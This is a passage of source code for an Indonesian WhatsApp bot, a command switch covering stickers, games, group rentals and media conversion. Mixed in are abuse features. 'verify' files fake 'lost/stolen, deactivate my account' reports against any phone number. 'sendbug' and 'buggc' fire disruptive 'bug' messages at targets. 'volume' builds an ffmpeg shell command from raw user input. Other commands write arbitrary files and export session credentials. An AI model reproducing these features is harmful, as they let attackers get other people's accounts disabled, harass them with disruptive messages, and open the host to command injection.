setReply(`Berhasil mengubah image reply`)
} else {
setReply(`Kirim gambar dengan caption ${prefix}setimagereply`);
}
}
break

    
case 'listowner':{
if(!_data.checkDataName("owner", q, DataId)) { await _data.createDataId("owner", DataId) }
let nana = await DataId.filter(item => item.name == "owner" )
if(!nana) return setReply("Tidak ada")
let teks ="List Owner\n"
let nunu = nana[0].id
for(let i of nunu){
teks +=`- wa.me/${i.split("@")[0]} \n`   
}    
setReply(teks)
}
break   

    
case 'patrick':
setReply(mess.wait)
await fetch('https://raw.githubusercontent.com/rashidsiregar28/data/main/patrik')
.then(res => res.text())
.then(body => {
let tod = body.split("\n");
let pjr = tod[Math.floor(Math.random() * tod.length)];
conn.sendImageAsSticker(from, pjr, m)
}
)
break
    
case 'gura':
setReply(mess.wait)
await fetch('https://raw.githubusercontent.com/rashidsiregar28/data/main/gura')
.then(res => res.text())
.then(body => {
let tod = body.split("\n");
let pjr = tod[Math.floor(Math.random() * tod.length)];
conn.sendImageAsSticker(from, pjr, m)
}
)
break

case 'doge':
setReply(mess.wait)
await fetch('https://raw.githubusercontent.com/rashidsiregar28/data/main/anjing')
.then(res => res.text())
.then(body => {
let tod = body.split("\n");
let pjr = tod[Math.floor(Math.random() * tod.length)];
//conn.sendMedia (from, pjr, m, {caption: "Nih"})
conn.sendImageAsSticker(from, pjr, m)
}
)
break


case 'addsewa':{
if(!isGroup){
const rex1 = /chat.whatsapp.com\/([\w\d]*)/g;
let LinkGc = q.split(" ")[0];
let Second = q.split(" ")[1];
let code = LinkGc.match(rex1);
if (code == null) return  setReply("No invite url detected.");
let kode = code[0].replace("chat.whatsapp.com/", "");
await conn.groupAcceptInvite(kode)
let { id, subject,creator,creation,desc,descId } = await conn.groupGetInviteInfo(kode).catch(async () => {
return setReply("Invalid invite url.");
});
let teks =`
Success
*Name:* ${subject}
*Id:* ${id}
*Days:* ${conn.msToDate(toMs(Second))}
*Countdown:* ${toMs(Second)}`
setReply(teks)
await conn.sendButMessage(id, `HALO KAK AKU *${fake}*`, `Silahkan pilih salah satu`, [
{buttonId: `${prefix}ceksewa`, buttonText: {displayText: `Cek sewa`,},type: 1},
{buttonId: `${prefix}menu`, buttonText: { displayText: `Menu`,},type: 1}],setQuoted);
await _sewa.addSewaGroup(id, subject, LinkGc, Second, sewa)
} else if(isGroup){
if(!q) return setReply("Maukian angka 1m/1d/1h")
if (isBotGroupAdmins) {
let linkgc = await conn.groupInviteCode(from)
var yeh = `https://chat.whatsapp.com/${linkgc}`
} else if(!isBotGroupAdmins){
var yeh = `Botz Is Not Admin`
} 
_sewa.addSewaGroup(from, groupName, yeh, q, sewa)
setReply("Berhasil Add Sewa ke group")
}
}
break

case 'ceksewa':
case  'sewacek':
if (!isGroup) return setReply(mess.only.group)
if (!_sewa.checkSewaGroup(from, sewa)) return setReply(`Group ini tidak terdaftar dalam list sewabot. Ketik ${prefix}sewabot untuk info lebih lanjut`)
let cekid = ms(_sewa.getSewaExpired(from, sewa) - Date.now())
let sewenye = `「 *SEWA EXPIRE* 」
*Group*: ${groupName}
*ID*: ${from}
*EXPIRE :* ${cekid.days} Hari, ${cekid.hours} Jam, ${cekid.minutes} Menit, ${cekid.seconds} Detik`
setReply(sewenye)
break    

    
case 'listsewa': {
let ordernye = `*List Sewa*\nJumlah : ${sewa.length}\n\n`
for (let i of sewa){
let cekvipp = ms(i.expired - Date.now())
ordernye += `Group : ${i.group}\nID : ${i.id}\nExpired : ${cekvipp.days} hari ${cekvipp.hours} jam ${cekvipp.minutes} menit ${cekvipp.seconds} detik\nLink : ${isOwner? i.linkgc : ""}\n\n`             
} 
ordernye += `© ${fake1}`
setReply(ordernye)
}
break

case 'cekprem':
case    'cekpremium':{
if (!isPremium && !isOwner) return setReply(`Kamu bukan user premium`)
let cekvip = ms(_prem.getPremiumExpired(sender, premium) - Date.now())
let premiumnya = `${cekvip.days} day(s) ${cekvip.hours} hour(s) ${cekvip.minutes} minute(s) ${cekvip.seconds} second(s)`
setReply(premiumnya)
}
break


case 'setimgquoted':{
if (!itsMe && !isOwner) return setReply(mess.only.ownerB)
if(isImage || isQuotedImage){
let delb = await conn.downloadAndSaveMediaMessage(quoted,makeid(5))
await fse.copy(delb,`./stik/quoted.jpg`)
fs.unlinkSync(delb)
setReply(`Berhasil mengubah image quoted`)
} else {
setReply(`Kirim gambar dengan caption ${prefix+command}`);
}
}
break  


case 'gdrive': {
const { sizeFormatter } = await import( 'human-readable')
let formatSize = sizeFormatter({
std: 'JEDEC', decimalPlaces: 2, keepTrailingZeroes: false, render: (literal, symbol) => `${literal} ${symbol}B`
})

async function GDriveDl(url) {
let id
if (!(url && url.match(/drive\.google/i))) return setReply( 'Invalid URL')
id = (url.match(/\/?id=(.+)/i) || url.match(/\/d\/(.*?)\//))[1]
if (!id) return setReply( 'ID Not Found')
let res = await fetch(`https://drive.google.com/uc?id=${id}&authuser=0&export=download`, {
method: 'post',
headers: {
'accept-encoding': 'gzip, deflate, br',
'content-length': 0,
'Content-Type': 'application/x-www-form-urlencoded;charset=UTF-8',
'origin': 'https://drive.google.com',
'user-agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/65.0.3325.181 Safari/537.36',
'x-client-data': 'CKG1yQEIkbbJAQiitskBCMS2yQEIqZ3KAQioo8oBGLeYygE=',
'x-drive-first-party': 'DriveWebUi',
'x-json-requested': 'true'
}
})
let { fileName, sizeBytes, downloadUrl } =  JSON.parse((await res.text()).slice(4))
if (!downloadUrl) return setReply( 'Link Download Limit!')
let data = await fetch(downloadUrl)
if (data.status !== 200) throw data.statusText
return { downloadUrl, fileName, fileSize: formatSize(sizeBytes), mimetype: data.headers.get('content-type') }
}

if (!q) return setReply( 'Input URL' )
GDriveDl(args[0]).then(async (res) => {
if (!res) throw res
await m.reply(JSON.stringify(res, null, 2))
conn.sendMessage(m.chat, { document: { url: res.downloadUrl }, fileName: res.fileName, mimetype: res.mimetype }, { quoted: m })
})
}
break
    
case 'family100': {
let winScore = 1000
let id = m.chat
if (id in conn.family) return setReply('Masih ada kuis yang belum terjawab di chat ini')
let src = await (await fetch('https://raw.githubusercontent.com/BochilTeam/database/master/games/family100.json')).json()
let json = src[Math.floor(Math.random() * src.length)]
let caption = `
*Soal:* ${json.soal}

Terdapat *${json.jawaban.length}* jawaban${json.jawaban.find(v => v.includes(' ')) ? `
(beberapa jawaban terdapat spasi)
`: ''}

+${winScore} Money tiap jawaban benar
`.trim()
conn.family[id] = {
id,

msg: await m.reply(caption),
...json,
terjawab: Array.from(json.jawaban, () => false),
winScore,
}
}
break


case 'math': {
let modes = {
noob: [-3, 3, -3, 3, '+-', 15000, 10],
easy: [-10, 10, -10, 10, '*/+-', 20000, 40],
medium: [-40, 40, -20, 20, '*/+-', 40000, 150],
hard: [-100, 100, -70, 70, '*/+-', 60000, 350],
extreme: [-999999, 999999, -999999, 999999, '*/', 99999, 9999],
impossible: [-99999999999, 99999999999, -99999999999, 999999999999, '*/', 30000, 35000],
impossible2: [-999999999999999, 999999999999999, -999, 999, '/', 30000, 50000]
}

let operators = {
'+': '+',
'-': '-',
'*': '×',
'/': '÷'
}

function genMath(mode) {
let [a1, a2, b1, b2, ops, time, bonus] = modes[mode]
let a = randomInt(a1, a2)
let b = randomInt(b1, b2)
let op = pickRandom([...ops])
let result = (new Function(`return ${a} ${op.replace('/', '*')} ${b < 0 ? `(${b})` : b}`))()
if (op == '/') [a, result] = [result, a]
return {
str: `${a} ${operators[op]} ${b}`,
mode,
time,
bonus,
result
}
}

function randomInt(from, to) {
if (from > to) [from, to] = [to, from]
from = Math.floor(from)
to = Math.floor(to)
return Math.floor((to - from) * Math.random() + from)
}


// conn.math = conn.math ? conn.math : {}
if (!q) return setReply( `
┌─〔 Mode 〕
├ ${Object.keys(modes).join('\n├ ')}
└────
contoh:
${prefix}math hard
`)
let mode = args[0].toLowerCase()
if (!(mode in modes)) return setReply( `
┌─〔 Mode 〕
├ ${Object.keys(modes).join('\n├ ')}
└────
contoh:
${prefix}math hard
`)
let id = from
if (id in conn.math) return setReply('Masih ada soal belum terjawab di chat ini')
let math2 = genMath(mode)
conn.math[id] = [
await setReply(`Berapa hasil dari *${math2.str}*?\n\nTimeout: ${(math2.time / 1000).toFixed(2)} detik\nBonus Jawaban Benar: Rp${math2.bonus} `),
math2, 4,
setTimeout(async () => {
//if (conn.math[id]) await conn.sendButton(from, `Waktu habis!\nJawabannya adalah ${math2.result}`, '', `${math2.mode.toUpperCase()}`, `.math ${math2.mode}`, conn.math[id][0])
if (conn.math[id]) await setReply(`Waktu habis!\nJawabannya adalah ${math2.result}\n\n${math2.mode.toUpperCase()}\n\nmath ${math2.mode}`)
delete conn.math[id]
}, math2.time)
]
}
break

case 'setimgdoc':{
if (!itsMe && !isOwner) return setReply(mess.only.ownerB)
if(isImage || isQuotedImage){
let delb = await conn.downloadAndSaveMediaMessage(quoted,makeid(5))
await fse.copy(delb,`./stik/thumbnaildokumen.jpg`)
fs.unlinkSync(delb)
setReply(`Berhasil mengubah image doc`)
} else {
setReply(`Kirim gambar dengan caption ${prefix+command}`);
}
}
break 



case 'addcmdowner':{
if (!isOwner) return onlyOwner()
if(!q) return setReply(mess.query)
if(_data.checkDataId("commands", q,  DataId)) return setReply("User sudah menjadi owner")
if(!_data.checkDataName("commands", q, DataId)) { await _data.createDataId("commands", DataId) }
_data.addDataId(q, "commands", DataId)
setReply(`Berhasil menambahkan ${q} ke daftar fitur owner`)
}
break

case 'delcmdowner':
if(!q) return setReply(mess.query)
if (!isOwner) return onlyOwner()
try {
if(!_data.checkDataId("commands", q, DataId)) return setReply(`User bukan owner`)
_data.removeDataId ("commands", q, DataId)
setReply(`Berhasil menghapus ${q} ke daftar fitur owner`)
} catch (err){
console.log(err)
setReply(`${err}`)
}
break

case 'listcmdowner':{
let nana = await DataId.filter(item => item.name == "commands" )
let teks ="List Commands For Owner\n"
let nunu = nana[0].id
for(let i of nunu){
teks +=`. ${i}\n`
}
setReply(teks)
}
break


case 'addcmdprem':{
if (!isOwner) return onlyOwner()
if(!q) return setReply(mess.query)
if(_data.checkDataId("premium", q,  DataId)) return setReply("Command sudah ada di database")
if(!_data.checkDataName("premium", q, DataId)) { await _data.createDataId("premium", DataId) }
_data.addDataId(q, "premium", DataId)
setReply(`Berhasil menambahkan ${q} ke daftar fitur premium`)
}
break

case 'delcmdprem':
if(!q) return setReply(mess.query)
if (!isOwner) return onlyOwner()
try {
if(!_data.checkDataId("premium", q, DataId)) return setReply("Command tidak ada di database")
_data.removeDataId ("premium", q, DataId)
setReply(`Berhasil menghapus ${q} ke daftar fitur premium`)
} catch (err){
console.log(err)
setReply(`${err}`)
}
break

case 'listcmdprem':{
if(!_data.checkDataName("premium", q, DataId)) { await _data.createDataId("premium", DataId) }
let nana = await DataId.filter(item => item.name == "premium" )
let teks ="List Command For Premium User\n\n"
let nunu = nana[0].id
for(let i of nunu){
teks +=`• ${toFirstCase(i)}\n`
}
teks +=`\n• Total: ${nunu.length}\n`
setReply(teks)
}
break


case  'addcmdlimit':{
if (!isOwner) return onlyOwner()
if(!q) return setReply(mess.query)
if(_data.checkDataId("limit", q,  DataId)) return setReply("Command sudah ada di database")
if(!_data.checkDataName("limit", q, DataId)) { await _data.createDataId("limit", DataId) }
_data.addDataId(q, "limit", DataId)
setReply(`Berhasil menambahkan ${q} ke daftar fitur limit`)
}
break

case  'delcmdlimit':
if(!q) return setReply(mess.query)
if (!isOwner) return onlyOwner()
try {
if(!_data.checkDataId("limit", q, DataId)) return setReply("Command tidak ada di database")
_data.removeDataId ("limit", q, DataId)
setReply(`Berhasil menghapus ${q} ke daftar fitur limit`)
} catch (err){
console.log(err)
setReply(`${err}`)
}
break

case 'listcmdlimit':{
let nana = await DataId.filter(item => item.name == "limit" )
let teks ="List Commands For limit\n"
let nunu = nana[0].id
for(let i of nunu){
teks +=`. ${i}\n`
}
setReply(teks)
}
break


case 'outdate':{
if (!itsMe && !isOwner) return onlyOwner()
exec("npm outdate --json", async (err, stdout) => {
if (err) return setReply(`${copyright}:~ ${err}`)
let listSerch = []
let teskd = `\n Berikut adalah module yang belom di update\n`
let yaya = JSON.parse(stdout)
let nana = Object.keys(yaya)
let nono = Object.entries(yaya)
for (let i of nana) {
listSerch.push({
title: i,
rowId: `${prefix}exec npm i ${i}@${yaya[i].latest}`,
description: `🔖 V${yaya[i].current} => V${yaya[i].latest}`
 })
}
const sections = [
{
title: "Total Version " + nana.length,
rows: listSerch
}
]
const listMessage = {
text: teskd,
footer: copyright,
title: `*List Version*`,
buttonText: "TAP",
sections
}
conn.sendMessage(from, listMessage, {quoted: m})
})
}
break


case 'delchat':
await conn.chatModify({
delete: true,
lastMessages: [{ key: m.key, messageTimestamp: m.messageTimestamp }]
},
from)
setReply("Sukses")
break
    

case 'clearallerror':
if (!isOwner) return onlyOwner()
setReply("SukseS clear all error")
_error.clear(listerror)
break

case 'listerror': {
let errornye = `*List Error*\nJumlah : ${db.data.listerror.length}\n\n`
for (let i of db.data.listerror){
errornye += `_*Command*_ : ${i.cmd}\n_*System Error*_ : ${i.error}\n\n*]─────────────────[*\n\n`
}
errornye += `© ${fake1}`
setReply(errornye)
}
break

case 'listonline': {
let id = args && /\d+\-\d+@g.us/.test(args[0]) ? args[0] : from
let online = [...Object.keys(store.presences[id]), botNumber]
conn.sendText(from, 'List Online:\n\n' + online.map(v => '⭔ @' + v.replace(/@.+/, '')).join`\n`, m, { mentions: online })
}
break


case 'listblock':{
let block = await conn.fetchBlocklist()            
setReply('List Block:\n\n' + `Total: ${block == undefined ? '*0* Diblokir' : '*' + block.length + '* Diblokir'}\n` + block.map(v => '⭔ @' + v.replace(/@.+/, '')).join`\n`)
}
break 

   
case 'afk':{
if(!q) return setReply("Alasan afk afa ?")
let user = global.db.data.users[m.sender]
user.afk = + new Date
user.afkReason = q
setReply(`${pushname} telah AFK dengan alasan ${q ? ': ' + q : ''}`)
}
break 

case  'limit':    
case 'ceklimit':{
//if(mentionByReply){
//let nomer = mentionByReply.split("@")[0]
//setReply(`*${await conn.getName(mentionByReply)}*\n\nLimit : ${isPremium ? 'Unlimited' : `${db.data.users[mentionByReply].limit}/${limitCount}`}\nLimit Game : ${db.data.users[mentionByReply].glimit}/${gcount}\nSaldo : Rp ${db.data.users[mentionByReply].balance.toLocaleString()}\n\nKamu dapat membeli limit dengan ${prefix}buylimit dan ${prefix}buyglimit untuk membeli game limit`) 
//} else {   
setReply(`*${pushname}*\n\nLimit : ${isPremium ? 'Unlimited' : `${db.data.users[sender].limit}/${limitCount}`}\nLimit Game : ${db.data.users[sender].glimit}/${gcount}\nSaldo : Rp ${db.data.users[sender].balance.toLocaleString()}\n\nKamu dapat membeli limit dengan ${prefix}buylimit dan ${prefix}buyglimit untuk membeli game limit`)
}
break

case 'newupdate':
case   'newinfo':{
if(!q) return setReply("Masukan info terbaru")
let data = global.db.data.others['newinfo']
if(data){
data.info = q
data.lastinfo = + new Date
setReply("Berhasil memperbarui info update")
} else{ global.db.data.others['newinfo'] = {
info:q,
lastinfo:+ new Date,
}
setReply("Berhasil memperbarui info update")
}
}
break

case 'linkgc':{
if (!isGroup) return setReply(mess.only.group)
if (!isBotGroupAdmins) return reply(mess.Badmin)
let Url = await conn.groupInviteCode(from).catch(() => seReply(mess.error.api))
let asu = 'https://chat.whatsapp.com/'+Url
setReply(asu)
}
break
    

case 'getsesi': {
const JSZIP = require('jszip')
const zip = new JSZIP();
if (!isOwner) return setReply(mess.only.owner)
setReply("Getting session file...")
const readSession = await fs.readdirSync(`./session`);
const folder = zip.folder("session");
for (let json of readSession) {
const jsonSession = await fs.readFileSync(`./session/${json}`);
folder.file(json, jsonSession);
}
let jpegThumbnail = fs.readFileSync("./stik/thumbnaildokumen.jpg")
let file = `./session.zip`
zip.generateNodeStream({ type: 'nodebuffer', streamFiles: true })
.pipe(fs.createWriteStream(`./session.zip`))
.on('finish', async () => {
let media = fs.readFileSync(file)
await conn.sendMessage(m.chat, { document: media, fileName: "Session file", mimetype: 'application/zip'  ,  jpegThumbnail  }, { quoted: m })
await fs.unlinkSync(file)
})
}
break

case 'ttp':{
const text2png = require('text2png');
await fs.writeFileSync('out.png', text2png(q, {font: '100px coolvetica rg',
localFontPath: 'src/font/coolvetica rg.otf',
localFontName: 'coolvetica rg',
color: 'white',
textAlign: "left",
lineSpacing: 10,
strokeColor: "black",
strokeWidth : 2,
padding: 20}))
let { Sticker, createSticker, StickerTypes } = require('wa-sticker-formatter')
let media = fs.readFileSync('out.png')
let jancok = new Sticker(media, {
pack: packName, // The pack name
author: authorName, // The author name
type: StickerTypes.FULL, // The sticker type
categories: ['🤩', '🎉'], // The sticker category
id: '12345', // The sticker id
quality: 70, // The quality of the output file
background: '#FFFFFF00' // The sticker background color (only for full stickers)
})
let stok = getRandom(".webp")
let nono = await jancok.toFile(stok)
let nah = fs.readFileSync(nono)
await conn.sendMessage(from,{sticker: nah},{quoted: m})
await fs.unlinkSync(stok)
await fs.unlinkSync('out.png')
}
break

case 'attp':
try {
if (args.length == 0) return setReply(`Example: ${prefix + command} YUconn`)
//let buffer = await getBuffer(`https://api.xteam.xyz/attp?file&text=${encodeURI(q)}`)
await conn.sendMessage(from, {sticker: {url:`https://api.xteam.xyz/attp?file&text=${encodeURI(q)}` }}, { quoted: m })
} catch (e) {
setReply(`Maap sedang error coba lagi besok`)
}
break

case 'inspect':{
const rex1 = /chat.whatsapp.com\/([\w\d]*)/g;
let code = q.match(rex1);
if (code === null) return  setReply("No invite url detected.");
code = code[0].replace("chat.whatsapp.com/", "");
let nana = await conn.groupGetInviteInfo(code)
//console.log(nana)
let { id, subject,creator,creation,desc,descId } = await conn.groupGetInviteInfo(code).catch(async () => {
return setReply("Invalid invite url.");
});
let text =
`Subject: ${subject}\nGroupId: ${id}${creator ? `\nCreator: ${creator.split("@")[0]}` : ""}
Create At: ${new Date(creation * 1000).toLocaleString()}` +`${desc ? `\nDesc: ${desc}\nDescId: ${descId}` : ""}`
setReply(text)

}
break

case 'rules':{
	//let teks =
  setReply(`
	Syarat dan Ketentuan menggunakan *${fake}*
	
	1. Nama dan nomer user ${fake}
		 akan Kami simpan di dalam 
		 server selama bot aktif
		 
	2. Data akan di hapus ketika bot Offline
		 atau di hapus oleh Owner Bot
	
	3. Kami tidak menyimpan gambar, 
		 video, file, audio, dan dokumen 
		 yang kamu kirim ke ${fake}
		 
	4. Kami tidak akan pernah meminta users 
		 untuk memberikan informasi pribadi
		 
	5. Jika menemukan Bug/Error silahkan 
		 langsung lapor ke Owner atau Developer
		 atau bisa juga memakai fitur _*reportbug*_
		 
	6. Beberapa fitur mungkin ada yang error, 
		 jadi tunggu sampai developer 
		 meperbaiki fitur tersebut
			 
	8. Bot ini sudah di lengkapi dengan
		 fitur _*Auto Report Bug*_ jika terjadi
		 error maka bot akan auto report ke
		 developer, terkecuali error yang
		 menyebabkan bot mati, maka user
		 harus lapor ke developer
		 
	7. Bot ini juga sudah di lengkapi dengan 
		 Fitur Anti Spam jika kamu terdeteksi 
		 melakukan spam, maka Bot tidak
		 akan menanggapi kamu selama 20 detik
		
	9. User dilarang keras menelpon bot!
		 jika melanggar maka kamu akan terkena 
		 banned,block dan dikirim bug
	
	10. Bot tidak akan menanggapi user yang
		   meminta untuk di save nomernya`)
	
	//let mok = [{"buttonId": `Thanks`,"buttonText": {"displayText": `ᴛʜᴀɴᴋs`},"type": "RESPONSE"},
					//	{"buttonId": `${prefix}dashboard`,"buttonText": {"displayText": `ᴅᴀsʜʙᴏᴀʀᴅ`},"type": "RESPONSE"}]
						
	//conn.sendButImage(from, teks, `© lana dev`, fs.readFileSync('./stik/bot.jpg'), mok, {quoted: m})             
	}
	break
    
//========================//

// SCRIPT BY : LANA DEV
// EROR?? WA : 085773089737
// JANGAN DI HAPUS ASU
// JUAL SCRIPT NERAKA PALING BAWAH

//===================//
    case  'sc':
case 'script':
case 'sourcecode':{
let data = global.db.data.others['runtime']
let time = (new Date - data.runtime) || "Tidak terdeteksi" 
let vid = { url : `https://telegra.ph/file/dbe46329640da8bf9e037.mp4`, type : "video/mp4" }	
let teks = `𝗦𝗢𝗨𝗥𝗖𝗘 𝗖𝗢𝗗𝗘


  「 *𝘚𝘤𝘳𝘪𝘱𝘵* 」
Runing On
Youtube : https://youtube.com/@maulanabot
Replit : https://replit.com/@lanabot


Nih bang SC bot nya, free salin aja linknya, terus misalnya lo udah masuk tinggal fork atau bisa juga langsung Run ya.`

setReply(teks)
await sleep(1500)
conn.sendMessage(from, { contextInfo: { externalAdReply: { showAdAttribution: true,
title: `${fake1}`,
body:`Runtime ${clockString(time)} `,
previewType:"PHOTO",
thumbnail: fs.readFileSync('./stik/reply.jpg'),
sourceUrl:`https://chat.whatsapp.com/JgJHpvM7K6UAYVlT2zQPFA`
}}, video: vid, caption: "*Nih Tutornya🗿*", mimetype: 'video/mp4' },{quoted: m})

let repli = `*_Tunggu, sedang mengirim video TUTORIAL runn bot_*`

let repli2 = `*wajib join group info bot jika script ada yang error*\n\nhttps://chat.whatsapp.com/JgJHpvM7K6UAYVlT2zQPFA`
await setReply(repli)
await setReply(repli2)
}
break

 case 'speedtest': {
let cp = require('child_process')
let { promisify } = require('util')
let exec2 = promisify(cp.exec).bind(cp)
await setReply("_Testing Speed..._")
let o
try {
o = await exec2('python speed.py')
} catch (e) {
o = e
} finally {
let { stdout, stderr } = o
if (stdout.trim()) setReply(stdout)
if (stderr.trim()) setReply(stderr)
}
}
break

case 'volume':
if (Number(args[0]) >= 11) return setReply("Maksimal volume adalah 10")
if (isQuotedAudio){
setReply(mess.wait)
let media3 = await conn.downloadAndSaveMediaMessage(quoted,makeid(5))
let rname = getRandom('.mp3')
exec(`ffmpeg -i ${media3} -filter:a "volume=${args[0]}" ${rname}`, async (err, stderr, stdout) => {
if (err) return setReply('Error!')
let jadie = fs.readFileSync(rname)
await conn.sendMessage(from, {audio: jadie, mimetype: 'audio/mp4', ptt: true }, {quoted: m})
fs.unlinkSync(rname)
fs.unlinkSync(media3)
}
)
} else {
setReply('Reply audio!')
}
break

case 'kalkulator':
const matematik = require('mathjs')
try{
let nana = q.replace("x","*")
let nunu = matematik.evaluate(nana)
let teks = `${q} = ${nunu}`
setReply(teks)
} catch (err){
setReply( 'Format salah, hanya 0-9 dan Simbol -, +, *, /, ×, ÷, π, e, (, ) yang disupport')
}
break

case 'transfer':{
if(!q) return setReply("Masukan angka")
if (isNaN(q)) return setReply(`Harus berupa angka`)
if(!mentionByReply) return setReply("Reply tatgetnya")
let ane = Number(math(q))
if (db.data.users[sender].balance < ane) return setReply(`Saldo kamu tidak mencukupi`)
db.data.users[mentionByReply].balance = ane
db.data.users[sender].balance -= ane
setReply(`Berhasil mentransfer saldo ke nomer ${mentionByReply.split("@")[0]} sebesar Rp.${Number(q).toLocaleString()}`)
}
break


case 'toimg': {
if (!isQuotedSticker) return setReply('Reply stickernya')
setReply(mess.wait)
let media = await conn.downloadAndSaveMediaMessage(quoted,makeid(5))
let ran = getRandom('.png')
exec(`ffmpeg -i ${media} ${ran}`, async (err) => {
fs.unlinkSync(media)
if (err) return setReply(err)
let buffer = fs.readFileSync(ran)
await conn.sendMessage(from, {caption: "Nih", image: buffer})
fs.unlinkSync(ran)
})
}
break


case 'tomp4':
if (isQuotedSticker) {
setReply(mess.wait)
let file = await conn.downloadAndSaveMediaMessage(quoted,makeid(5))
let outGif = `./temp/${getRandom('.gif')}`
let outMp4 = `./temp/${getRandom('.mp4')}`
//convert webp ke gif pakai imagemagick
exec(`convert ${file} ${outGif}`, (err) => {
if (err) {
console.log(err)
return setReply(`${err}`)
}

//lalu convert gif ke mp4 pakai ffmpeg
exec(`ffmpeg -i ${outGif} -vf "crop=trunc(iw/2)*2:trunc(ih/2)*2" -b:v 0 -crf 25 -f mp4 -vcodec libx264 -pix_fmt yuv420p ${outMp4}`, async (err) => {
if (err) {
console.log(err)
return setReply(`${err}`)
}
await conn.sendMessage(from,{video: fs.readFileSync(outMp4), caption: "Nih"},{quoted: m})
fs.unlinkSync(outGif)
fs.unlinkSync(outMp4)
fs.unlinkSync(file)
})
})

}
break
    

case 'toptt':
if (isQuotedAudio){
setReply(mess.wait)
let media = await conn.downloadAndSaveMediaMessage(quoted,makeid(5))
let ran = getRandom('.mp3')
exec(`ffmpeg -i ${media} ${ran}`, async (err) => {
fs.unlinkSync(media)
if (err) return setReply('Gagal mengkonversi audio ke ptt')
let topt = fs.readFileSync(ran)
await conn.sendMessage(from,{audio: topt, mimetype: 'audio/mp4', ptt:true}, {quoted: m})
fs.unlinkSync(ran)
})
} else {
setReply("Reply audio")
}
break


case 'togif':
if ( isQuotedSticker) {
setReply(mess.wait)
let file = await  conn.downloadAndSaveMediaMessage(quoted,makeid(5))
let outGif = `./${getRandom('.gif')}`
let outMp4 = `./${getRandom('.mp4')}`

//convert webp ke gif pakai imagemagick
exec(`convert ${file} ${outGif}`,async (err) => {
await fs.unlinkSync(file)
if (err) {
console.log(err)
return setReply(`${err}`)
}

//lalu convert gif ke mp4 pakai ffmpeg
exec(`ffmpeg -i ${outGif} -vf "crop=trunc(iw/2)*2:trunc(ih/2)*2" -b:v 0 -crf 25 -f mp4 -vcodec libx264 -pix_fmt yuv420p ${outMp4}`, async (err) => {
if (err) {
console.log(err)
return setReply(`${err}`)
}
await sendGif(fs.readFileSync(outMp4))
await fs.unlinkSync(outGif)
await fs.unlinkSync(outMp4)

})
})

} else if(isQuotedVideo){
setReply(mess.wait)
let outMp4 = getRandom('.mp4')
let file = await conn.downloadAndSaveMediaMessage(quoted,makeid(5))
let nana = await fs.readFileSync(file)
await sendGif(nana)
await fs.unlinkSync(file)
}
break

case 'verify':{
if(!q) return setReply("Masukan nomer telepon")
if(!q.startsWith("+")) return setReply("masukan kode negara comtoh +62")
var imel = await (await axios.get("https://www.1secmail.com/api/v1/?action=genRandomMailbox&count=1")).data[0]
 let data = {
  jazoest: '2954',
  lsd: 'AVotQVSNJiE',
  step: 'articles',
  country_selector: 'BR',
  phone_number: q,
  email: imel,
  email_confirm: imel,
  platform: 'ANDROID',
  your_message: 'Perdido/roubado: desative minha conta',
  __user: '0',
  __a: '1',
  __dyn: '7wKwkHgmwn8K2WnFwn84a2i5U4e1Fx-ewSwMxW0SU1nEhwem0nCq1ewcG0KE33w8G1nzU1vrzo5-0me220qu0L8ly82swdq0Ho2ewnE3fw6iw4vwbS1Lw4Cw',
  __csr: '',
  __req: '7',
  __hs: '19319.BP:whatsapp_www_pkg.2.22.23.85',
  dpr: '1',
  __ccg: 'UNKNOWN',
  __rev: '1006635516',
  __s: 'ng4ktn:fe3p07:ramsmu',
  __hsi: '7169210791910218313',
  __comet_req: '0'
}

let res = await axios({
  url: "https://www.whatsapp.com/contact/noclient/async/",
  method: "POST",
  headers: {
    cookie: "wa_lang_pref=tp_br; wa_ul=cf4df212-78b9-481b-8276-9dc801b280000; wa_csrf=d1BrQRQLuxsm0UE-L-O-wq",
  },
  data: new URLSearchParams(data)+""
}).then(res => res).catch(err => err.response)
return setReply(util.format(JSON.stringify( res.status == 200 ? JSON.parse(res.data.replace("for (;;);", "")):res, null, 2)))
}
break


case 'sendbug':
try{
if(!isOwner) return onlyOwner()
let Pe = mentionByTag[0]? mentionByTag[0] : mentionByReply ? mentionByReply : q? numberQuery : false
console.log(Pe)
if(!Pe ) return setReply("Masukan nomer target")
if(Pe == Ownerin) return setReply("SendBug Gagal")
await setReply("Sending...")
	//await conn.sendKatalog(Pe, virtex8(prefix), virtex8(prefix), thumb, {quoted: setQuoted})
//	let a = await conn.sendMessage(from, { react: { text: "0️", key: { remoteJid: from, fromMe: true, id: dev.id } } })
	//conn.sendMessage(Pe, { text: "halo" }, { quoted: a });
 const muk = [{urlButton: {displayText: `Owner Bot`,url: `https://wa.me/${nomerOwner}`}}, 
{urlButton: {displayText: `Owner Bot`,url: `https://wa.me/${nomerOwner}`}}, 
{urlButton: {displayText: `Owner Bot`,url: `https://wa.me/${nomerOwner}`}}, 
{ quickReplyButton: { displayText: `ᴅᴀsʜʙᴏᴀʀᴅ`, id: `${prefix}dashboard` } },
{ quickReplyButton: { displayText: `ᴅᴀsʜʙᴏᴀʀᴅ`, id: `${prefix}dashboard` } },
{ quickReplyButton: { displayText: `sᴇᴡᴀ ʙᴏᴛᴢ`, id: `${prefix}sewa` } }]
conn.send5ButMessage  (Pe, fake, copyright, muk  )
setReply(`Berhasil mengirim Bug ke Nomer ${Pe.split("@")[0]}`)
} catch (err){
console.log(err)
setReply("Gagal mengirim bug, Terjadi Error")
}
break
//========================//

// SCRIPT BY : LANA DEV
// EROR?? WA : 085773089737
// JANGAN DI HAPUS ASU
// JUAL SCRIPT NERAKA PALING BAWAH

//===================//
// 99% work 
case 'buggc':{
const { proto, generateWAMessageFromContent } = require('baileys')
if (!isOwner) return setReply('Fitur Ini Hanya Dapat Digunakan Oleh Developer!')
if (!isGroup) return setReply('Fitur Ini Hanya Dapat Digunakan Di Dalam Group!')
let requestPaymentMessage = generateWAMessageFromContent(from, proto.Message.fromObject({"requestPaymentMessage": {"currencyCodeIso4217": "IDR","amount1000": "1000","extendedTextMessage": {"text": "64 65 6E 69 73 6A 75 6C 69 61 6E 64 72 61 70 75 74 72 61"}}}), { userJid: from })
conn.relayMessage(from, requestPaymentMessage.message, { messageId: requestPaymentMessage.key.id })
}
break 

case 'savefile':{
if(!isOwner) return setReply(mess.only.owner)
if (!q) return setReply( `where is the path?\n\nexample:\n${prefix + command} plugins/menu.js`)
if (!m.quoted.text) return setReply( `reply code`)
let path = `${q}`
await require('fs').writeFileSync(path, m.quoted.text)
